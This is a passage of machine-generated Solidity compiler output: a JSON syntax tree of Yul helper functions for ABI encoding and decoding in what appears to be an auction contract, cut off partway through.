"},{"body":{"nativeSrc":"903:139:10","nodeType":"YulBlock","src":"903:139:10","statements":[{"nativeSrc":"913:26:10","nodeType":"YulAssignment","src":"913:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"925:9:10","nodeType":"YulIdentifier","src":"925:9:10"},{"kind":"number","nativeSrc":"936:2:10","nodeType":"YulLiteral","src":"936:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"921:3:10","nodeType":"YulIdentifier","src":"921:3:10"},"nativeSrc":"921:18:10","nodeType":"YulFunctionCall","src":"921:18:10"},"variableNames":[{"name":"tail","nativeSrc":"913:4:10","nodeType":"YulIdentifier","src":"913:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"1008:6:10","nodeType":"YulIdentifier","src":"1008:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"1021:9:10","nodeType":"YulIdentifier","src":"1021:9:10"},{"kind":"number","nativeSrc":"1032:1:10","nodeType":"YulLiteral","src":"1032:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"1017:3:10","nodeType":"YulIdentifier","src":"1017:3:10"},"nativeSrc":"1017:17:10","nodeType":"YulFunctionCall","src":"1017:17:10"}],"functionName":{"name":"abi_encode_t_enum$_AuctionState_$1057_to_t_uint8_fromStack","nativeSrc":"949:58:10","nodeType":"YulIdentifier","src":"949:58:10"},"nativeSrc":"949:86:10","nodeType":"YulFunctionCall","src":"949:86:10"},"nativeSrc":"949:86:10","nodeType":"YulExpressionStatement","src":"949:86:10"}]},"name":"abi_encode_tuple_t_enum$_AuctionState_$1057__to_t_uint8__fromStack_reversed","nativeSrc":"790:252:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"875:9:10","nodeType":"YulTypedName","src":"875:9:10","type":""},{"name":"value0","nativeSrc":"887:6:10","nodeType":"YulTypedName","src":"887:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"898:4:10","nodeType":"YulTypedName","src":"898:4:10","type":""}],"src":"790:252:10"},{"body":{"nativeSrc":"1092:32:10","nodeType":"YulBlock","src":"1092:32:10","statements":[{"nativeSrc":"1102:16:10","nodeType":"YulAssignment","src":"1102:16:10","value":{"name":"value","nativeSrc":"1113:5:10","nodeType":"YulIdentifier","src":"1113:5:10"},"variableNames":[{"name":"cleaned","nativeSrc":"1102:7:10","nodeType":"YulIdentifier","src":"1102:7:10"}]}]},"name":"cleanup_t_int256","nativeSrc":"1048:76:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1074:5:10","nodeType":"YulTypedName","src":"1074:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"1084:7:10","nodeType":"YulTypedName","src":"1084:7:10","type":""}],"src":"1048:76:10"},{"body":{"nativeSrc":"1193:52:10","nodeType":"YulBlock","src":"1193:52:10","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"1210:3:10","nodeType":"YulIdentifier","src":"1210:3:10"},{"arguments":[{"name":"value","nativeSrc":"1232:5:10","nodeType":"YulIdentifier","src":"1232:5:10"}],"functionName":{"name":"cleanup_t_int256","nativeSrc":"1215:16:10","nodeType":"YulIdentifier","src":"1215:16:10"},"nativeSrc":"1215:23:10","nodeType":"YulFunctionCall","src":"1215:23:10"}],"functionName":{"name":"mstore","nativeSrc":"1203:6:10","nodeType":"YulIdentifier","src":"1203:6:10"},"nativeSrc":"1203:36:10","nodeType":"YulFunctionCall","src":"1203:36:10"},"nativeSrc":"1203:36:10","nodeType":"YulExpressionStatement","src":"1203:36:10"}]},"name":"abi_encode_t_int256_to_t_int256_fromStack","nativeSrc":"1130:115:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1181:5:10","nodeType":"YulTypedName","src":"1181:5:10","type":""},{"name":"pos","nativeSrc":"1188:3:10","nodeType":"YulTypedName","src":"1188:3:10","type":""}],"src":"1130:115:10"},{"body":{"nativeSrc":"1347:122:10","nodeType":"YulBlock","src":"1347:122:10","statements":[{"nativeSrc":"1357:26:10","nodeType":"YulAssignment","src":"1357:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"1369:9:10","nodeType":"YulIdentifier","src":"1369:9:10"},{"kind":"number","nativeSrc":"1380:2:10","nodeType":"YulLiteral","src":"1380:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"1365:3:10","nodeType":"YulIdentifier","src":"1365:3:10"},"nativeSrc":"1365:18:10","nodeType":"YulFunctionCall","src":"1365:18:10"},"variableNames":[{"name":"tail","nativeSrc":"1357:4:10","nodeType":"YulIdentifier","src":"1357:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"1435:6:10","nodeType":"YulIdentifier","src":"1435:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"1448:9:10","nodeType":"YulIdentifier","src":"1448:9:10"},{"kind":"number","nativeSrc":"1459:1:10","nodeType":"YulLiteral","src":"1459:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"1444:3:10","nodeType":"YulIdentifier","src":"1444:3:10"},"nativeSrc":"1444:17:10","nodeType":"YulFunctionCall","src":"1444:17:10"}],"functionName":{"name":"abi_encode_t_int256_to_t_int256_fromStack","nativeSrc":"1393:41:10","nodeType":"YulIdentifier","src":"1393:41:10"},"nativeSrc":"1393:69:10","nodeType":"YulFunctionCall","src":"1393:69:10"},"nativeSrc":"1393:69:10","nodeType":"YulExpressionStatement","src":"1393:69:10"}]},"name":"abi_encode_tuple_t_int256__to_t_int256__fromStack_reversed","nativeSrc":"1251:218:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"1319:9:10","nodeType":"YulTypedName","src":"1319:9:10","type":""},{"name":"value0","nativeSrc":"1331:6:10","nodeType":"YulTypedName","src":"1331:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"1342:4:10","nodeType":"YulTypedName","src":"1342:4:10","type":""}],"src":"1251:218:10"},{"body":{"nativeSrc":"1520:32:10","nodeType":"YulBlock","src":"1520:32:10","statements":[{"nativeSrc":"1530:16:10","nodeType":"YulAssignment","src":"1530:16:10","value":{"name":"value","nativeSrc":"1541:5:10","nodeType":"YulIdentifier","src":"1541:5:10"},"variableNames":[{"name":"cleaned","nativeSrc":"1530:7:10","nodeType":"YulIdentifier","src":"1530:7:10"}]}]},"name":"cleanup_t_uint256","nativeSrc":"1475:77:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1502:5:10","nodeType":"YulTypedName","src":"1502:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"1512:7:10","nodeType":"YulTypedName","src":"1512:7:10","type":""}],"src":"1475:77:10"},{"body":{"nativeSrc":"1623:53:10","nodeType":"YulBlock","src":"1623:53:10","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"1640:3:10","nodeType":"YulIdentifier","src":"1640:3:10"},{"arguments":[{"name":"value","nativeSrc":"1663:5:10","nodeType":"YulIdentifier","src":"1663:5:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"1645:17:10","nodeType":"YulIdentifier","src":"1645:17:10"},"nativeSrc":"1645:24:10","nodeType":"YulFunctionCall","src":"1645:24:10"}],"functionName":{"name":"mstore","nativeSrc":"1633:6:10","nodeType":"YulIdentifier","src":"1633:6:10"},"nativeSrc":"1633:37:10","nodeType":"YulFunctionCall","src":"1633:37:10"},"nativeSrc":"1633:37:10","nodeType":"YulExpressionStatement","src":"1633:37:10"}]},"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"1558:118:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1611:5:10","nodeType":"YulTypedName","src":"1611:5:10","type":""},{"name":"pos","nativeSrc":"1618:3:10","nodeType":"YulTypedName","src":"1618:3:10","type":""}],"src":"1558:118:10"},{"body":{"nativeSrc":"1780:124:10","nodeType":"YulBlock","src":"1780:124:10","statements":[{"nativeSrc":"1790:26:10","nodeType":"YulAssignment","src":"1790:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"1802:9:10","nodeType":"YulIdentifier","src":"1802:9:10"},{"kind":"number","nativeSrc":"1813:2:10","nodeType":"YulLiteral","src":"1813:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"1798:3:10","nodeType":"YulIdentifier","src":"1798:3:10"},"nativeSrc":"1798:18:10","nodeType":"YulFunctionCall","src":"1798:18:10"},"variableNames":[{"name":"tail","nativeSrc":"1790:4:10","nodeType":"YulIdentifier","src":"1790:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"1870:6:10","nodeType":"YulIdentifier","src":"1870:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"1883:9:10","nodeType":"YulIdentifier","src":"1883:9:10"},{"kind":"number","nativeSrc":"1894:1:10","nodeType":"YulLiteral","src":"1894:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"1879:3:10","nodeType":"YulIdentifier","src":"1879:3:10"},"nativeSrc":"1879:17:10","nodeType":"YulFunctionCall","src":"1879:17:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"1826:43:10","nodeType":"YulIdentifier","src":"1826:43:10"},"nativeSrc":"1826:71:10","nodeType":"YulFunctionCall","src":"1826:71:10"},"nativeSrc":"1826:71:10","nodeType":"YulExpressionStatement","src":"1826:71:10"}]},"name":"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed","nativeSrc":"1682:222:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"1752:9:10","nodeType":"YulTypedName","src":"1752:9:10","type":""},{"name":"value0","nativeSrc":"1764:6:10","nodeType":"YulTypedName","src":"1764:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"1775:4:10","nodeType":"YulTypedName","src":"1775:4:10","type":""}],"src":"1682:222:10"},{"body":{"nativeSrc":"1950:35:10","nodeType":"YulBlock","src":"1950:35:10","statements":[{"nativeSrc":"1960:19:10","nodeType":"YulAssignment","src":"1960:19:10","value":{"arguments":[{"kind":"number","nativeSrc":"1976:2:10","nodeType":"YulLiteral","src":"1976:2:10","type":"","value":"64"}],"functionName":{"name":"mload","nativeSrc":"1970:5:10","nodeType":"YulIdentifier","src":"1970:5:10"},"nativeSrc":"1970:9:10","nodeType":"YulFunctionCall","src":"1970:9:10"},"variableNames":[{"name":"memPtr","nativeSrc":"1960:6:10","nodeType":"YulIdentifier","src":"1960:6:10"}]}]},"name":"allocate_unbounded","nativeSrc":"1910:75:10","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nativeSrc":"1943:6:10","nodeType":"YulTypedName","src":"1943:6:10","type":""}],"src":"1910:75:10"},{"body":{"nativeSrc":"2080:28:10","nodeType":"YulBlock","src":"2080:28:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"2097:1:10","nodeType":"YulLiteral","src":"2097:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"2100:1:10","nodeType":"YulLiteral","src":"2100:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"2090:6:10","nodeType":"YulIdentifier","src":"2090:6:10"},"nativeSrc":"2090:12:10","nodeType":"YulFunctionCall","src":"2090:12:10"},"nativeSrc":"2090:12:10","nodeType":"YulExpressionStatement","src":"2090:12:10"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"1991:117:10","nodeType":"YulFunctionDefinition","src":"1991:117:10"},{"body":{"nativeSrc":"2203:28:10","nodeType":"YulBlock","src":"2203:28:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"2220:1:10","nodeType":"YulLiteral","src":"2220:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"2223:1:10","nodeType":"YulLiteral","src":"2223:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"2213:6:10","nodeType":"YulIdentifier","src":"2213:6:10"},"nativeSrc":"2213:12:10","nodeType":"YulFunctionCall","src":"2213:12:10"},"nativeSrc":"2213:12:10","nodeType":"YulExpressionStatement","src":"2213:12:10"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nativeSrc":"2114:117:10","nodeType":"YulFunctionDefinition","src":"2114:117:10"},{"body":{"nativeSrc":"2280:79:10","nodeType":"YulBlock","src":"2280:79:10","statements":[{"body":{"nativeSrc":"2337:16:10","nodeType":"YulBlock","src":"2337:16:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"2346:1:10","nodeType":"YulLiteral","src":"2346:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"2349:1:10","nodeType":"YulLiteral","src":"2349:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"2339:6:10","nodeType":"YulIdentifier","src":"2339:6:10"},"nativeSrc":"2339:12:10","nodeType":"YulFunctionCall","src":"2339:12:10"},"nativeSrc":"2339:12:10","nodeType":"YulExpressionStatement","src":"2339:12:10"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"2303:5:10","nodeType":"YulIdentifier","src":"2303:5:10"},{"arguments":[{"name":"value","nativeSrc":"2328:5:10","nodeType":"YulIdentifier","src":"2328:5:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"2310:17:10","nodeType":"YulIdentifier","src":"2310:17:10"},"nativeSrc":"2310:24:10","nodeType":"YulFunctionCall","src":"2310:24:10"}],"functionName":{"name":"eq","nativeSrc":"2300:2:10","nodeType":"YulIdentifier","src":"2300:2:10"},"nativeSrc":"2300:35:10","nodeType":"YulFunctionCall","src":"2300:35:10"}],"functionName":{"name":"iszero","nativeSrc":"2293:6:10","nodeType":"YulIdentifier","src":"2293:6:10"},"nativeSrc":"2293:43:10","nodeType":"YulFunctionCall","src":"2293:43:10"},"nativeSrc":"2290:63:10","nodeType":"YulIf","src":"2290:63:10"}]},"name":"validator_revert_t_uint256","nativeSrc":"2237:122:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"2273:5:10","nodeType":"YulTypedName","src":"2273:5:10","type":""}],"src":"2237:122:10"},{"body":{"nativeSrc":"2417:87:10","nodeType":"YulBlock","src":"2417:87:10","statements":[{"nativeSrc":"2427:29:10","nodeType":"YulAssignment","src":"2427:29:10","value":{"arguments":[{"name":"offset","nativeSrc":"2449:6:10","nodeType":"YulIdentifier","src":"2449:6:10"}],"functionName":{"name":"calldataload","nativeSrc":"2436:12:10","nodeType":"YulIdentifier","src":"2436:12:10"},"nativeSrc":"2436:20:10","nodeType":"YulFunctionCall","src":"2436:20:10"},"variableNames":[{"name":"value","nativeSrc":"2427:5:10","nodeType":"YulIdentifier","src":"2427:5:10"}]},{"expression":{"arguments":[{"name":"value","nativeSrc":"2492:5:10","nodeType":"YulIdentifier","src":"2492:5:10"}],"functionName":{"name":"validator_revert_t_uint256","nativeSrc":"2465:26:10","nodeType":"YulIdentifier","src":"2465:26:10"},"nativeSrc":"2465:33:10","nodeType":"YulFunctionCall","src":"2465:33:10"},"nativeSrc":"2465:33:10","nodeType":"YulExpressionStatement","src":"2465:33:10"}]},"name":"abi_decode_t_uint256","nativeSrc":"2365:139:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nativeSrc":"2395:6:10","nodeType":"YulTypedName","src":"2395:6:10","type":""},{"name":"end","nativeSrc":"2403:3:10","nodeType":"YulTypedName","src":"2403:3:10","type":""}],"returnVariables":[{"name":"value","nativeSrc":"2411:5:10","nodeType":"YulTypedName","src":"2411:5:10","type":""}],"src":"2365:139:10"},{"body":{"nativeSrc":"2576:263:10","nodeType":"YulBlock","src":"2576:263:10","statements":[{"body":{"nativeSrc":"2622:83:10","nodeType":"YulBlock","src":"2622:83:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"2624:77:10","nodeType":"YulIdentifier","src":"2624:77:10"},"nativeSrc":"2624:79:10","nodeType":"YulFunctionCall","src":"2624:79:10"},"nativeSrc":"2624:79:10","nodeType":"YulExpressionStatement","src":"2624:79:10"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nativeSrc":"2597:7:10","nodeType":"YulIdentifier","src":"2597:7:10"},{"name":"headStart","nativeSrc":"2606:9:10","nodeType":"YulIdentifier","src":"2606:9:10"}],"functionName":{"name":"sub","nativeSrc":"2593:3:10","nodeType":"YulIdentifier","src":"2593:3:10"},"nativeSrc":"2593:23:10","nodeType":"YulFunctionCall","src":"2593:23:10"},{"kind":"number","nativeSrc":"2618:2:10","nodeType":"YulLiteral","src":"2618:2:10","type":"","value":"32"}],"functionName":{"name":"slt","nativeSrc":"2589:3:10","nodeType":"YulIdentifier","src":"2589:3:10"},"nativeSrc":"2589:32:10","nodeType":"YulFunctionCall","src":"2589:32:10"},"nativeSrc":"2586:119:10","nodeType":"YulIf","src":"2586:119:10"},{"nativeSrc":"2715:117:10","nodeType":"YulBlock","src":"2715:117:10","statements":[{"nativeSrc":"2730:15:10","nodeType":"YulVariableDeclaration","src":"2730:15:10","value":{"kind":"number","nativeSrc":"2744:1:10","nodeType":"YulLiteral","src":"2744:1:10","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"2734:6:10","nodeType":"YulTypedName","src":"2734:6:10","type":""}]},{"nativeSrc":"2759:63:10","nodeType":"YulAssignment","src":"2759:63:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"2794:9:10","nodeType":"YulIdentifier","src":"2794:9:10"},{"name":"offset","nativeSrc":"2805:6:10","nodeType":"YulIdentifier","src":"2805:6:10"}],"functionName":{"name":"add","nativeSrc":"2790:3:10","nodeType":"YulIdentifier","src":"2790:3:10"},"nativeSrc":"2790:22:10","nodeType":"YulFunctionCall","src":"2790:22:10"},{"name":"dataEnd","nativeSrc":"2814:7:10","nodeType":"YulIdentifier","src":"2814:7:10"}],"functionName":{"name":"abi_decode_t_uint256","nativeSrc":"2769:20:10","nodeType":"YulIdentifier","src":"2769:20:10"},"nativeSrc":"2769:53:10","nodeType":"YulFunctionCall","src":"2769:53:10"},"variableNames":[{"name":"value0","nativeSrc":"2759:6:10","nodeType":"YulIdentifier","src":"2759:6:10"}]}]}]},"name":"abi_decode_tuple_t_uint256","nativeSrc":"2510:329:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"2546:9:10","nodeType":"YulTypedName","src":"2546:9:10","type":""},{"name":"dataEnd","nativeSrc":"2557:7:10","nodeType":"YulTypedName","src":"2557:7:10","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"2569:6:10","nodeType":"YulTypedName","src":"2569:6:10","type":""}],"src":"2510:329:10"},{"body":{"nativeSrc":"2890:81:10","nodeType":"YulBlock","src":"2890:81:10","statements":[{"nativeSrc":"2900:65:10","nodeType":"YulAssignment","src":"2900:65:10","value":{"arguments":[{"name":"value","nativeSrc":"2915:5:10","nodeType":"YulIdentifier","src":"2915:5:10"},{"kind":"number","nativeSrc":"2922:42:10","nodeType":"YulLiteral","src":"2922:42:10","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nativeSrc":"2911:3:10","nodeType":"YulIdentifier","src":"2911:3:10"},"nativeSrc":"2911:54:10","nodeType":"YulFunctionCall","src":"2911:54:10"},"variableNames":[{"name":"cleaned","nativeSrc":"2900:7:10","nodeType":"YulIdentifier","src":"2900:7:10"}]}]},"name":"cleanup_t_uint160","nativeSrc":"2845:126:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"2872:5:10","nodeType":"YulTypedName","src":"2872:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"2882:7:10","nodeType":"YulTypedName","src":"2882:7:10","type":""}],"src":"2845:126:10"},{"body":{"nativeSrc":"3022:51:10","nodeType":"YulBlock","src":"3022:51:10","statements":[{"nativeSrc":"3032:35:10","nodeType":"YulAssignment","src":"3032:35:10","value":{"arguments":[{"name":"value","nativeSrc":"3061:5:10","nodeType":"YulIdentifier","src":"3061:5:10"}],"functionName":{"name":"cleanup_t_uint160","nativeSrc":"3043:17:10","nodeType":"YulIdentifier","src":"3043:17:10"},"nativeSrc":"3043:24:10","nodeType":"YulFunctionCall","src":"3043:24:10"},"variableNames":[{"name":"cleaned","nativeSrc":"3032:7:10","nodeType":"YulIdentifier","src":"3032:7:10"}]}]},"name":"cleanup_t_address","nativeSrc":"2977:96:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"3004:5:10","nodeType":"YulTypedName","src":"3004:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"3014:7:10","nodeType":"YulTypedName","src":"3014:7:10","type":""}],"src":"2977:96:10"},{"body":{"nativeSrc":"3144:53:10","nodeType":"YulBlock","src":"3144:53:10","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"3161:3:10","nodeType":"YulIdentifier","src":"3161:3:10"},{"arguments":[{"name":"value","nativeSrc":"3184:5:10","nodeType":"YulIdentifier","src":"3184:5:10"}],"functionName":{"name":"cleanup_t_address","nativeSrc":"3166:17:10","nodeType":"YulIdentifier","src":"3166:17:10"},"nativeSrc":"3166:24:10","nodeType":"YulFunctionCall","src":"3166:24:10"}],"functionName":{"name":"mstore","nativeSrc":"3154:6:10","nodeType":"YulIdentifier","src":"3154:6:10"},"nativeSrc":"3154:37:10","nodeType":"YulFunctionCall","src":"3154:37:10"},"nativeSrc":"3154:37:10","nodeType":"YulExpressionStatement","src":"3154:37:10"}]},"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"3079:118:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"3132:5:10","nodeType":"YulTypedName","src":"3132:5:10","type":""},{"name":"pos","nativeSrc":"3139:3:10","nodeType":"YulTypedName","src":"3139:3:10","type":""}],"src":"3079:118:10"},{"body":{"nativeSrc":"3245:48:10","nodeType":"YulBlock","src":"3245:48:10","statements":[{"nativeSrc":"3255:32:10","nodeType":"YulAssignment","src":"3255:32:10","value":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"3280:5:10","nodeType":"YulIdentifier","src":"3280:5:10"}],"functionName":{"name":"iszero","nativeSrc":"3273:6:10","nodeType":"YulIdentifier","src":"3273:6:10"},"nativeSrc":"3273:13:10","nodeType":"YulFunctionCall","src":"3273:13:10"}],"functionName":{"name":"iszero","nativeSrc":"3266:6:10","nodeType":"YulIdentifier","src":"3266:6:10"},"nativeSrc":"3266:21:10","nodeType":"YulFunctionCall","src":"3266:21:10"},"variableNames":[{"name":"cleaned","nativeSrc":"3255:7:10","nodeType":"YulIdentifier","src":"3255:7:10"}]}]},"name":"cleanup_t_bool","nativeSrc":"3203:90:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"3227:5:10","nodeType":"YulTypedName","src":"3227:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"3237:7:10","nodeType":"YulTypedName","src":"3237:7:10","type":""}],"src":"3203:90:10"},{"body":{"nativeSrc":"3358:50:10","nodeType":"YulBlock","src":"3358:50:10","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"3375:3:10","nodeType":"YulIdentifier","src":"3375:3:10"},{"arguments":[{"name":"value","nativeSrc":"3395:5:10","nodeType":"YulIdentifier","src":"3395:5:10"}],"functionName":{"name":"cleanup_t_bool","nativeSrc":"3380:14:10","nodeType":"YulIdentifier","src":"3380:14:10"},"nativeSrc":"3380:21:10","nodeType":"YulFunctionCall","src":"3380:21:10"}],"functionName":{"name":"mstore","nativeSrc":"3368:6:10","nodeType":"YulIdentifier","src":"3368:6:10"},"nativeSrc":"3368:34:10","nodeType":"YulFunctionCall","src":"3368:34:10"},"nativeSrc":"3368:34:10","nodeType":"YulExpressionStatement","src":"3368:34:10"}]},"name":"abi_encode_t_bool_to_t_bool_fromStack","nativeSrc":"3299:109:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"3346:5:10","nodeType":"YulTypedName","src":"3346:5:10","type":""},{"name":"pos","nativeSrc":"3353:3:10","nodeType":"YulTypedName","src":"3353:3:10","type":""}],"src":"3299:109:10"},{"body":{"nativeSrc":"3646:531:10","nodeType":"YulBlock","src":"3646:531:10","statements":[{"nativeSrc":"3656:27:10","nodeType":"YulAssignment","src":"3656:27:10","value":{"arguments":[{"name":"headStart","nativeSrc":"3668:9:10","nodeType":"YulIdentifier","src":"3668:9:10"},{"kind":"number","nativeSrc":"3679:3:10","nodeType":"YulLiteral","src":"3679:3:10","type":"","value":"192"}],"functionName":{"name":"add","nativeSrc":"3664:3:10","nodeType":"YulIdentifier","src":"3664:3:10"},"nativeSrc":"3664:19:10","nodeType":"YulFunctionCall","src":"3664:19:10"},"variableNames":[{"name":"tail","nativeSrc":"3656:4:10","nodeType":"YulIdentifier","src":"3656:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"3737:6:10","nodeType":"YulIdentifier","src":"3737:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"3750:9:10","nodeType":"YulIdentifier","src":"3750:9:10"},{"kind":"number","nativeSrc":"3761:1:10","nodeType":"YulLiteral","src":"3761:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"3746:3:10","nodeType":"YulIdentifier","src":"3746:3:10"},"nativeSrc":"3746:17:10","nodeType":"YulFunctionCall","src":"3746:17:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"3693:43:10","nodeType":"YulIdentifier","src":"3693:43:10"},"nativeSrc":"3693:71:10","nodeType":"YulFunctionCall","src":"3693:71:10"},"nativeSrc":"3693:71:10","nodeType":"YulExpressionStatement","src":"3693:71:10"},{"expression":{"arguments":[{"name":"value1","nativeSrc":"3818:6:10","nodeType":"YulIdentifier","src":"3818:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"3831:9:10","nodeType":"YulIdentifier","src":"3831:9:10"},{"kind":"number","nativeSrc":"3842:2:10","nodeType":"YulLiteral","src":"3842:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"3827:3:10","nodeType":"YulIdentifier","src":"3827:3:10"},"nativeSrc":"3827:18:10","nodeType":"YulFunctionCall","src":"3827:18:10"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"3774:43:10","nodeType":"YulIdentifier","src":"3774:43:10"},"nativeSrc":"3774:72:10","nodeType":"YulFunctionCall","src":"3774:72:10"},"nativeSrc":"3774:72:10","nodeType":"YulExpressionStatement","src":"3774:72:10"},{"expression":{"arguments":[{"name":"value2","nativeSrc":"3900:6:10","nodeType":"YulIdentifier","src":"3900:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"3913:9:10","nodeType":"YulIdentifier","src":"3913:9:10"},{"kind":"number","nativeSrc":"3924:2:10","nodeType":"YulLiteral","src":"3924:2:10","type":"","value":"64"}],"functionName":{"name":"add","nativeSrc":"3909:3:10","nodeType":"YulIdentifier","src":"3909:3:10"},"nativeSrc":"3909:18:10","nodeType":"YulFunctionCall","src":"3909:18:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"3856:43:10","nodeType":"YulIdentifier","src":"3856:43:10"},"nativeSrc":"3856:72:10","nodeType":"YulFunctionCall","src":"3856:72:10"},"nativeSrc":"3856:72:10","nodeType":"YulExpressionStatement","src":"3856:72:10"},{"expression":{"arguments":[{"name":"value3","nativeSrc":"3982:6:10","nodeType":"YulIdentifier","src":"3982:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"3995:9:10","nodeType":"YulIdentifier","src":"3995:9:10"},{"kind":"number","nativeSrc":"4006:2:10","nodeType":"YulLiteral","src":"4006:2:10","type":"","value":"96"}],"functionName":{"name":"add","nativeSrc":"3991:3:10","nodeType":"YulIdentifier","src":"3991:3:10"},"nativeSrc":"3991:18:10","nodeType":"YulFunctionCall","src":"3991:18:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"3938:43:10","nodeType":"YulIdentifier","src":"3938:43:10"},"nativeSrc":"3938:72:10","nodeType":"YulFunctionCall","src":"3938:72:10"},"nativeSrc":"3938:72:10","nodeType":"YulExpressionStatement","src":"3938:72:10"},{"expression":{"arguments":[{"name":"value4","nativeSrc":"4064:6:10","nodeType":"YulIdentifier","src":"4064:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"4077:9:10","nodeType":"YulIdentifier","src":"4077:9:10"},{"kind":"number","nativeSrc":"4088:3:10","nodeType":"YulLiteral","src":"4088:3:10","type":"","value":"128"}],"functionName":{"name":"add","nativeSrc":"4073:3:10","nodeType":"YulIdentifier","src":"4073:3:10"},"nativeSrc":"4073:19:10","nodeType":"YulFunctionCall","src":"4073:19:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"4020:43:10","nodeType":"YulIdentifier","src":"4020:43:10"},"nativeSrc":"4020:73:10","nodeType":"YulFunctionCall","src":"4020:73:10"},"nativeSrc":"4020:73:10","nodeType":"YulExpressionStatement","src":"4020:73:10"},{"expression":{"arguments":[{"name":"value5","nativeSrc":"4141:6:10","nodeType":"YulIdentifier","src":"4141:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"4154:9:10","nodeType":"YulIdentifier","src":"4154:9:10"},{"kind":"number","nativeSrc":"4165:3:10","nodeType":"YulLiteral","src":"4165:3:10","type":"","value":"160"}],"functionName":{"name":"add","nativeSrc":"4150:3:10","nodeType":"YulIdentifier","src":"4150:3:10"},"nativeSrc":"4150:19:10","nodeType":"Yu